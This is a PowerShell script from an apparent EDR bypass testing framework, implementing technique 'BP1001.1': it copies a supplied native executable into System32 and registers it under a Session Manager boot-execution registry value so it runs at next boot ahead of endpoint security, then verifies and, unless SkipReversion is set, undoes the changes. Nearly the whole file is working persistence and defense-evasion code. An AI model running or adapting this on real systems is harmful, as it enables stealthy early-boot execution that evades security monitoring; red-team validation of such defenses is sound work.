#==============================================================================
# BP1001.1 - BootExecute EDR Bypass via Registry Manipulation
# EDR Bypass Testing Automation Framework
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [string]$BinaryName = "bootexecute.exe",
    
    [Parameter(Mandatory=$false)]
    [ValidateSet("BootExecute", "BootExecuteNoPnpSync", "SetupExecute", "PlatformExecute")]
    [string]$RegistryMethod = "BootExecuteNoPnpSync"
)

# Set strict mode and error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# Constants
$TECHNIQUE_ID = "BP1001.1"
$TECHNIQUE_NAME = "BootExecute EDR Bypass via Registry Manipulation"
$SCRIPT_VERSION = "1.0.0"

# Result constants
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_ERROR = "ERROR"

# Global variables for state management
$global:LogFilePath = $null
$global:JsonResultPath = $null
$global:OriginalRegistryState = @{}
$global:BinaryDeployed = $false
$global:System32Path = "$env:SystemRoot\System32"
$global:TargetBinaryPath = "$global:System32Path\$BinaryName"
$global:SourceBinaryPath = ".\$BinaryName"

#==============================================================================
# LOGGING AND UTILITY FUNCTIONS
#==============================================================================

function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $global:LogFilePath = Join-Path $LogDirectory "$TECHNIQUE_ID-registry_$timestamp.log"
        $global:JsonResultPath = Join-Path $LogDirectory "$TECHNIQUE_ID-registry_$timestamp`_result.json"
        
        Write-Log "=== $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Log initialized: $global:LogFilePath" -Level "INFO"
        Write-Log "Script version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Registry method: $RegistryMethod" -Level "INFO"
        Write-Log "Binary name: $BinaryName" -Level "INFO"
    }
    catch {
        Write-Error "Failed to initialize logging: $_"
        exit 1
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # Write to console with appropriate color
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($VerbosePreference -eq 'Continue') { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry -ForegroundColor White }
    }
    
    # Write to log file
    if ($global:LogFilePath) {
        Add-Content -Path $global:LogFilePath -Value $logEntry -Encoding UTF8
    }
}

function Test-AdminPrivileges {
    try {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = [Security.Principal.WindowsPrincipal]$currentUser
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        
        Write-Log "Administrator privilege check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $_" -Level "ERROR"
        return $false
    }
}

function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = $timestamp
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
        RegistryMethod = $RegistryMethod
        BinaryName = $BinaryName
    }
    
    # Write JSON result
    if ($global:JsonResultPath) {
        $result | ConvertTo-Json -Depth 3 | Set-Content -Path $global:JsonResultPath -Encoding UTF8
    }
    
    # Write standardized output for orchestrator
    Write-Host "TECHNIQUE_RESULT:$Status|$Message"
    Write-Log "Final result: $Status - $Message" -Level "INFO"
}

#==============================================================================
# BOOT EXECUTE SPECIFIC FUNCTIONS
#==============================================================================

function Get-BootExecuteRegistryPath {
    return "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
}

function Backup-OriginalState {
    Write-Log "Backing up original system state..." -Level "INFO"
    
    try {
        $registryPath = Get-BootExecuteRegistryPath
        
        # Backup current registry value
        try {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $RegistryMethod -ErrorAction SilentlyContinue
            if ($currentValue) {
                $global:OriginalRegistryState[$RegistryMethod] = $currentValue.$RegistryMethod
                Write-Log "Backed up existing $RegistryMethod value: $($currentValue.$RegistryMethod -join ', ')" -Level "DEBUG"
            } else {
                $global:OriginalRegistryState[$RegistryMethod] = $null
                Write-Log "No existing $RegistryMethod value found" -Level "DEBUG"
            }
        }
        catch {
            $global:OriginalRegistryState[$RegistryMethod] = $null
            Write-Log "Registry key $RegistryMethod does not exist (will be created)" -Level "DEBUG"
        }
        
        # Check if binary already exists
        if (Test-Path $global:TargetBinaryPath) {
            Write-Log "Warning: Target binary already exists at $global:TargetBinaryPath" -Level "WARN"
        }
        
        Write-Log "Original state backup completed" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $_" -Level "ERROR"
        return $false
    }
}

function Test-BinaryAvailability {
    Write-Log "Checking for source binary availability..." -Level "INFO"
    
    if (-not (Test-Path $global:SourceBinaryPath)) {
        Write-Log "Source binary not found: $global:SourceBinaryPath" -Level "ERROR"
        Write-Log "Expected: Native Windows executable with NtProcessStartup entry point" -Level "INFO"
        return $false
    }
    
    try {
        $fileInfo = Get-Item $global:SourceBinaryPath
        Write-Log "Source binary found: $($fileInfo.Name), Size: $($fileInfo.Length) bytes" -Level "INFO"
        
        # Basic validation - check if it's an executable
        if ($fileInfo.Extension -ne ".exe") {
            Write-Log "Warning: Source file is not an .exe file" -Level "WARN"
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to validate source binary: $_" -Level "ERROR"
        return $false
    }
}

function Deploy-Binary {
    Write-Log "Deploying binary to System32..." -Level "INFO"
    
    try {
        # Ensure System32 directory exists (should always exist)
        if (-not (Test-Path $global:System32Path)) {
            Write-Log "System32 directory not found: $global:System32Path" -Level "ERROR"
            return $false
        }
        
        # Copy binary to System32
        Copy-Item -Path $global:SourceBinaryPath -Destination $global:TargetBinaryPath -Force
        $global:BinaryDeployed = $true
        
        # Verify deployment
        if (Test-Path $global:TargetBinaryPath) {
            $deployedFile = Get-Item $global:TargetBinaryPath
            Write-Log "Binary deployed successfully: $global:TargetBinaryPath" -Level "INFO"
            Write-Log "Deployed file size: $($deployedFile.Length) bytes" -Level "DEBUG"
            return $true
        } else {
            Write-Log "Binary deployment verification failed" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to deploy binary: $_" -Level "ERROR"
        return $false
    }
}

function Set-BootExecuteRegistry {
    Write-Log "Configuring Boot Execute registry..." -Level "INFO"
    
    try {
        $registryPath = Get-BootExecuteRegistryPath
        $binaryName = [System.IO.Path]::GetFileNameWithoutExtension($BinaryName)
        
        # Prepare new value based on registry method
        $newValue = switch ($RegistryMethod) {
            "BootExecute" {
                # For BootExecute, we typically append to existing autocheck entries
                $existing = $global:OriginalRegistryState[$RegistryMethod]
                if ($existing) {
                    $existing + $binaryName
                } else {
                    @("autocheck autochk *", $binaryName)
                }
            }
            "BootExecuteNoPnpSync" {
                # Simple binary name for no PnP sync
                @($binaryName)
            }
            "SetupExecute" {
                # Simple binary name for setup execute
                @($binaryName)
            }
            "PlatformExecute" {
                # Simple binary name for platform execute
                @($binaryName)
            }
        }
        
        # Set the registry value
        Set-ItemProperty -Path $registryPath -Name $RegistryMethod -Value $newValue -Type MultiString
        
        Write-Log "Registry value set: $RegistryMethod = $($newValue -join ', ')" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to set Boot Execute registry: $_" -Level "ERROR"
        return $false
    }
}

function Invoke-BypassTechnique {
    Write-Log "Executing BootExecute bypass technique..." -Level "INFO"
    
    try {
        # Step 1: Deploy binary to System32
        if (-not (Deploy-Binary)) {
            return $false
        }
        
        # Step 2: Configure Boot Execute registry
        if (-not (Set-BootExecuteRegistry)) {
            return $false
        }
        
        Write-Log "BootExecute bypass technique completed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Bypass technique execution failed: $_" -Level "ERROR"
        return $false
    }
}

function Test-BypassSuccess {
    Write-Log "Verifying bypass implementation..." -Level "INFO"
    
    try {
        $success = $true
        
        # Verify binary deployment
        if (Test-Path $global:TargetBinaryPath) {
            Write-Log "[OK] Binary successfully deployed to System32" -Level "INFO"
        } else {
            Write-Log "[FAIL] Binary not found in System32" -Level "ERROR"
            $success = $false
        }
        
        # Verify registry configuration
        $registryPath = Get-BootExecuteRegistryPath
        try {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $RegistryMethod -ErrorAction Stop
            $binaryName = [System.IO.Path]::GetFileNameWithoutExtension($BinaryName)
            
            if ($currentValue.$RegistryMethod -contains $binaryName) {
                Write-Log "[OK] Registry correctly configured: $RegistryMethod contains $binaryName" -Level "INFO"
            } else {
                Write-Log "[FAIL] Registry verification failed: $RegistryMethod does not contain $binaryName" -Level "ERROR"
                Write-Log "Current value: $($currentValue.$RegistryMethod -join ', ')" -Level "DEBUG"
                $success = $false
            }
        }
        catch {
            Write-Log "[FAIL] Failed to read registry value: $_" -Level "ERROR"
            $success = $false
        }
        
        if ($success) {
            Write-Log "Bypass verification successful - BootExecute configured for next boot" -Level "INFO"
        }
        
        return $success
    }
    catch {
        Write-Log "Bypass verification failed: $_" -Level "ERROR"
        return $false
    }
}

function Remove-DeployedBinary {
    Write-Log "Removing deployed binary..." -Level "INFO"
    
    try {
        if (Test-Path $global:TargetBinaryPath) {
            Remove-Item -Path $global:TargetBinaryPath -Force
            Write-Log "Binary removed from System32" -Level "INFO"
        } else {
            Write-Log "Binary not found in System32 (already removed or never deployed)" -Level "DEBUG"
        }
        
        $global:BinaryDeployed = $false
        return $true
    }
    catch {
        Write-Log "Failed to remove binary: $_" -Level "ERROR"
        return $false
    }
}

function Restore-RegistryState {
    Write-Log "Restoring original registry state..." -Level "INFO"
    
    try {
        $registryPath = Get-BootExecuteRegistryPath
        $originalValue = $global:OriginalRegistryState[$RegistryMethod]
        
        if ($originalValue -ne $null) {
            # Restore original value
            Set-ItemProperty -Path $registryPath -Name $RegistryMethod -Value $originalValue -Type MultiString
            Write-Log "Registry value restored: $RegistryMethod = $($originalValue -join ', ')" -Level "INFO"
        } else {
            # Remove the value if it didn't exist originally
            try {
                Remove-ItemProperty -Path $registryPath -Name $RegistryMethod -ErrorAction Stop
                Write-Log "Registry value removed: $RegistryMethod (did not exist originally)" -Level "INFO"
            }
            catch {
                Write-Log "Registry value was not found to remove (expected)" -Level "DEBUG"
            }
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to restore registry state: $_" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    Write-Log "Reverting system to original state..." -Level "INFO"
    
    try {
        $success = $true
        
        # Remove deployed binary
        if (-not (Remove-DeployedBinary)) {
            $success = $false
        }
        
        # Restore registry state
        if (-not (Restore-RegistryState)) {
            $success = $false
        }
        
        if ($success) {
            Write-Log "State reversion completed successfully" -Level "INFO"
        } else {
            Write-Log "State reversion completed with errors" -Level "WARN"
        }
        
        return $success
    }
    catch {
        Write-Log "State reversion failed: $_" -Level "ERROR"
        return $false
    }
}

function Test-ReversionSuccess {
    Write-Log "Verifying system reversion..." -Level "INFO"
    
    try {
        $success = $true
        
        # Verify binary removal
        if (Test-Path $global:TargetBinaryPath) {
            Write-Log "[FAIL] Binary still exists in System32" -Level "ERROR"
            $success = $false
        } else {
            Write-Log "[OK] Binary successfully removed from System32" -Level "INFO"
        }
        
        # Verify registry restoration
        $registryPath = Get-BootExecuteRegistryPath
        $originalValue = $global:OriginalRegistryState[$RegistryMethod]
        
        try {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $RegistryMethod -ErrorAction SilentlyContinue
            
            if ($originalValue -eq $null) {
                # Should not exist
                if ($currentValue) {
                    Write-Log "[FAIL] Registry value still exists (should have been removed)" -Level "ERROR"
                    $success = $false
                } else {
                    Write-Log "[OK] Registry value correctly removed" -Level "INFO"
                }
            } else {
                # Should match original
                if ($currentValue -and (Compare-Object $currentValue.$RegistryMethod $originalValue) -eq $null) {
                    Write-Log "[OK] Registry value correctly restored" -Level "INFO"
                } else {
                    Write-Log "[FAIL] Registry value not properly restored" -Level "ERROR"
                    $success = $false
                }
            }
        }
        catch {
            if ($originalValue -eq $null) {
                Write-Log "[OK] Registry value correctly removed (error expected)" -Level "INFO"
            } else {
                Write-Log "[FAIL] Failed to verify registry restoration: $_" -Level "ERROR"
                $success = $false
            }
        }
        
        if ($success) {
            Write-Log "System reversion verification successful" -Level "INFO"
        }
        
        return $success
    }
    catch {
        Write-Log "Reversion verification failed: $_" -Level "ERROR"
        return $false
    }
}

#==============================================================================
# MAIN EXECUTION
#==============================================================================

function main {
    try {
        # Initialize logging
        Initialize-Logging -LogDirectory $LogPath
        
        Write-Log "Starting $TECHNIQUE_NAME execution..." -Level "INFO"
        
        # Pre-execution checks
        Write-Log "Performing pre-execution checks..." -Level "INFO"
        
        if (-not (Test-AdminPrivileges)) {
            Write-TestResult -Status $RESULT_ERROR -Message "Administrator privileges required" -Details @{
                RequiredPrivileges = "Administrator"
                CurrentUser = [Environment]::UserName
            }
            exit 2
        }
        
        if (-not (Test-BinaryAvailability)) {
            Write-TestResult -Status $RESULT_ERROR -Message "Source binary not available" -Details @{
                ExpectedPath = $global:SourceBinaryPath
                BinaryName = $BinaryName
            }
            exit 6
        }
        
        # Backup original state
        Write-Log "Creating system state backup..." -Level "INFO"
        if (-not (Backup-OriginalState)) {
            Write-TestResult -Status $RESULT_ERROR -Message "Failed to backup original state"
            exit 1
        }
        
        # Execute bypass technique
        Write-Log "Executing bypass technique..." -Level "INFO"
        if (-not (Invoke-BypassTechnique)) {
            Write-TestResult -Status $RESULT_FAILURE -Message "Bypass technique execution failed"
            
            if (-not $SkipReversion) {
                Write-Log "Attempting cleanup after failure..." -Level "WARN"
                Invoke-StateReversion | Out-Null
            }
            exit 3
        }
        
        # Verify bypass success
        Write-Log "Verifying bypass implementation..." -Level "INFO"
        if (-not (Test-BypassSuccess)) {
            Write-TestResult -Status $RESULT_FAILURE -Message "Bypass verification failed"
            
            if (-not $SkipReversion) {
                Write-Log "Attempting cleanup after verification failure..." -Level "WARN"
                Invoke-StateReversion | Out-Null
            }
            exit 4
        }
        
        # State reversion (unless skipped)
        if (-not $SkipReversion) {
            Write-Log "Reverting to original state..." -Level "INFO"
            if (-not (Invoke-StateReversion)) {
                Write-TestResult -Status $RESULT_SUCCESS -Message "Bypass successful but reversion failed" -Details @{
                    BypassApplied = $true
                    BypassVerified = $true
                    StateReverted = $false
                    Warning = "Manual cleanup may be required"
                }
                exit 5
            }
            
            # Verify reversion
            if (-not (Test-ReversionSuccess)) {
                Write-TestResult -Status $RESULT_SUCCESS -Message "Bypass successful but reversion verification failed" -Details @{
                    BypassApplied = $true
                    BypassVerified = $true
                    StateReverted = $true
                    ReversionVerified = $false
                }
                exit 5
            }
        }
        
        # Success
        $details = @{
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            ReversionVerified = (-not $SkipReversion)
            RegistryMethod = $RegistryMethod
            BinaryDeployed = $true
        }
        
        if ($SkipReversion) {
            Write-TestResult -Status $RESULT_SUCCESS -Message "BootExecute bypass configured successfully (reversion skipped)" -Details $details
        } else {
            Write-TestResult -Status $RESULT_SUCCESS -Message "BootExecute bypass technique executed and reverted successfully" -Details $details
        }
        
        exit 0
    }
    catch {
        Write-Log "Unexpected error in main execution: $_" -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        
        # Attempt emergency cleanup
        try {
            if ($global:BinaryDeployed -and -not $SkipReversion) {
                Write-Log "Attempting emergency cleanup..." -Level "WARN"
                Invoke-StateReversion | Out-Null
            }
        }
        catch {
            Write-Log "Emergency cleanup failed: $_" -Level "ERROR"
        }
        
        Write-TestResult -Status $RESULT_ERROR -Message "Unexpected error occurred: $_"
        exit 1
    }
    finally {
        Write-Log "Script execution completed" -Level "INFO"
    }
}

# Execute main function
main